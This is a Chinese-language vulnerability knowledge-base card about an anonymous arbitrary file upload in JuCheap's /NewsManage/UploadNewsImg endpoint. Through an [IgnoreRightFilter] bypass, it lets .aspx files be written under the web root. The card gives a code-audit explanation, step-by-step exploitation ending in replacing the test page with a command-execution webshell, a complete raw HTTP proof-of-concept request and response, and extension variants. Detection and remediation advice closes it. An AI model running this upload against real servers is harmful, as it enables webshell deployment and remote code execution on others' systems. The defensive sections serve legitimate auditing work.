---
id: web-generic-file-upload-jucheap-newsmanage-uploadnewsimg-aspx
title: JuCheap NewsManage/UploadNewsImg 经 IgnoreRightFilter 匿名上传：原始后缀直存 UpLoad\News 返回 aspx 地址
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-mvc-ignorerightfilter-multipart-original-extension-upload
tags:
- web
- dotnet
- aspnet
- mvc
- file-upload
- unrestricted-upload
- auth-bypass
- webshell
- rce
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V238
  verified_at: '2026-11-07T09:25:54+08:00'
  notes: 已对照原文与图 4/16/17 核对：[IgnoreRightFilter] 的 UploadNewsImg 取 Request.Files[0]，LastIndexOf('.') 取原始后缀，SaveAs 到 UpLoad\News，回显 http://host:port/UpLoad/News/<年+月+日+时+分+秒>.<后缀>；请求无 Cookie，响应仍 returnFlag:true 并同时给出 errorMsg=文件格式不正确（未阻断落盘），与卡一致。dup-scan 与 VideoUpLoad likely_duplicate 裁决：MVC 入口/IgnoreRightFilter/UpLoad\News 与 API 的 AllowAnonymous/EventVideo 完全不同，保留两张。原文未访问该 aspx。
url: /docs/web/generic/file-upload/web-generic-file-upload-jucheap-newsmanage-uploadnewsimg-aspx/
draft: false
kb_aliases:
- JuCheap UploadNewsImg
- /NewsManage/UploadNewsImg
- IgnoreRightFilter 匿名上传
- MVC 统一权限过滤器绕过
- 新闻图片上传 aspx
---

## 一句话结论

JuCheap 的 MVC 动作 `NewsManageController.UploadNewsImg()` 标注 `[IgnoreRightFilter]`，绕过系统统一权限过滤器后匿名可达；它取 `Request.Files[0]`，用“年+月+日+时+分+秒”加客户端文件名的最后一段扩展名拼成文件名，直接 `SaveAs` 到站点根下的 `UpLoad\News` 并把 `http://host:port/UpLoad/News/<时间戳>.<后缀>` 回显给请求者；没有真正的扩展名白名单/内容校验，上传 `evil.aspx` 后响应仍返回 `returnFlag:true` 与 aspx 访问地址（原文响应里同时出现“文件格式不正确”的 errorMsg，但未阻断落盘），构成前台任意文件上传。

## 原理

- 入口：`JuCheap.Web` 的 `NewsManageController.UploadNewsImg()`，方法体首行标注 `[IgnoreRightFilter]`。该属性是系统自定义的统一权限过滤器豁免标记，效果等价于匿名放行；原文鉴权分析指出大量 MVC 动作用它绕过了统一权限过滤器。
- 接收：`HttpFileCollection files = System.Web.HttpContext.Current.Request.Files;` 取 `files[0]` 作为 `HttpPostedFile`，只判断集合数量和对象非空，没有登录态/token/Session 校验。
- 落盘：`text = Path.Combine(HttpRuntime.AppDomainAppPath, "UpLoad\\News")`；`text2 = now.Year.ToString() + now.Month + now.Day + now.Hour + now.Minute + now.Second`（不补零，形如 `202598174611`）；`text3 = httpPostedFile.FileName.Substring(httpPostedFile.FileName.LastIndexOf(".") + 1).ToLower()`；`filename = text + "\\" + text2 + "." + text3`；`httpPostedFile.SaveAs(filename)`。
- 回显：`value2 = "http://" + base.Request.Url.Host + ":" + Request.Url.Port + "/UpLoad/News/" + text2 + "." + text3;`，写入哈希表 `imgurl`，`flag = true`，最后 `Json(hashtable, JsonRequestBehavior.AllowGet)` 返回。
- 成立关键：扩展名取自客户端 `FileName` 最后一个点之后的全部内容，只做了 `ToLower()`，没有白名单、没有 Content-Type/魔数校验、没有重命名为随机 UUID；保存目录位于 Web 应用根目录内，IIS 默认把 `.aspx` 交给 ASP.NET 解析。响应还会把完整 URL 返回，攻击者无需猜文件名。
- 原文响应同时出现 `"errorMsg":"文件格式不正确"` 与 `"returnFlag":true`、`"imgurl":".../UpLoad/News/202598174611.aspx"`，说明格式校验的结果只被写进提示字段，没有阻断 `SaveAs`/成功标志，属于“校验存在但不生效”的典型实现。
- 时间戳只到秒且没有随机数，同一秒内的多次上传会因同名而互相覆盖；对利用的影响是文件名可预测/可覆盖，不影响任意后缀落盘。

## 触发条件

- 目标为使用 JuCheap.Web 的 .NET MVC 应用，`/NewsManage/UploadNewsImg` 路由可达。
- `[IgnoreRightFilter]` 生效（统一权限过滤器被该属性跳过），且站点未额外加全局鉴权/请求过滤拦截该动作。
- 应用池账户对站点 `UpLoad\News` 目录有写权限（目录不存在会由代码创建）。
- IIS 允许 `UpLoad\News` 下的 `.aspx` 等脚本扩展被解析；若目录禁止脚本执行，则退化为任意文件上传/覆盖。

## 利用步骤

1. 直接向 `/NewsManage/UploadNewsImg` 发送 multipart 请求，不携带任何 Cookie/token，观察是否返回 JSON 而不是登录跳转。
2. `file` 字段文件名设为 `evil.aspx`，内容放最小 ASPX 标记页（如 `<% Response.Write("test"); %>`），其他字段可留空。
3. 读取响应中的 `imgurl`（形如 `http://host:port/UpLoad/News/202598174611.aspx`）；若 `returnFlag` 为 true 即表示已落盘。
4. GET 该 `imgurl` 验证 ASPX 是否被解析执行；原文只展示了上传成功的 JSON，未单独访问该 aspx，但同站 `uploadAttachment` 的实测已证明该 IIS 会执行上传目录中的 aspx。
5. 将标记页替换为命令执行/文件管理/内存马等 webshell；文件名扩展也可换成 `.ashx`、`.asmx`、`.config` 等按目标 IIS 映射测试。

## PoC

原文上传请求与响应：

```http
POST /NewsManage/UploadNewsImg HTTP/1.1
Host: <target>
Connection: close
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="evil.aspx"
Content-Type: application/octet-stream

111
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
Set-Cookie: ASP.NET_SessionId=<new>; path=/; HttpOnly

{"imgurl":"http://<target>/UpLoad/News/202598174611.aspx","errorMsg":"文件格式不正确","returnFlag":true}
```

说明：请求未带任何会话，响应却新建 `ASP.NET_SessionId` 并返回上传地址，说明该动作匿名可达；`errorMsg` 的格式提示未阻止文件写入。实际验证请使用无害标记页。

## 变体与关联

- 变体（扩展名）：`.aspx`、`.ashx`、`.asmx`、`.svc`、`.config`，取决于 IIS 请求过滤与处理程序映射；`.config` 可尝试改写处理程序。
- 变体（文件名）：时间戳精确到秒且无随机数，可预测/同秒覆盖；若 `FileName` 含多个点（`x.aspx.jpg`），代码取最后一个点之后的内容，实际后缀为 `jpg`，需按目标行为选择。
- 变体（鉴权）：把 `[IgnoreRightFilter]` 换成其他自定义过滤器名时，审计时同样应搜索该属性并逐个确认是否匿名放行。
- 关联：[[web-generic-file-upload-jucheap-app-uploadattachment-base64-aspx]]（同系统 `/api/APP/uploadAttachment` Base64 上传，已实测 aspx 执行）、[[web-generic-file-upload-jucheap-app-videoupload-original-extension]]（同系统 `VideoUpLoad` 原始文件名上传）。
- 同类：[[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]]、[[web-generic-file-upload-dongsheng-logistics-extension-no-check]]、[[web-generic-file-upload-extension-zero-check]]。
- 边界：上传目录禁止脚本、请求过滤拦截 `.aspx`、动作补上鉴权或真正执行后缀白名单时，webshell 不成立；原文未访问本接口返回的 aspx，执行性依托同站已验证的 aspx 解析能力。

## 检测与防御

- 请求检测：`/NewsManage/UploadNewsImg` 的 multipart 文件名后缀为 `.aspx`/`.ashx`/`.asmx`/`.config`/`.svc`；请求不带 Cookie 却调用上传接口；同一 IP 高频上传或上传内容含 `<%@`、`<%`、`eval(`。
- 主机检测：`UpLoad\News` 目录新增脚本文件；w3wp 进程向该目录写入 `.aspx`；IIS 日志中对 `/UpLoad/News/*.aspx` 的 GET/POST 与编译错误；响应中出现 `errorMsg=文件格式不正确` 但文件仍落地的情况。
- 修复：移除上传动作上的 `[IgnoreRightFilter]` 或在其内部补鉴权；扩展名使用服务端白名单映射，不能直接取客户端 `FileName` 的最后一段；校验 Content-Type 与魔数；服务端随机命名（UUID）并覆盖同名；上传目录移出 Web 根或禁止脚本执行。
- 加固：统一权限过滤器改为默认拒绝、显式白名单放行，避免自定义属性一标即匿名；对上传接口做大小/频率限制；WAF 拦截脚本后缀与 webshell 特征；定期扫描 `UpLoad` 目录中的可执行文件。
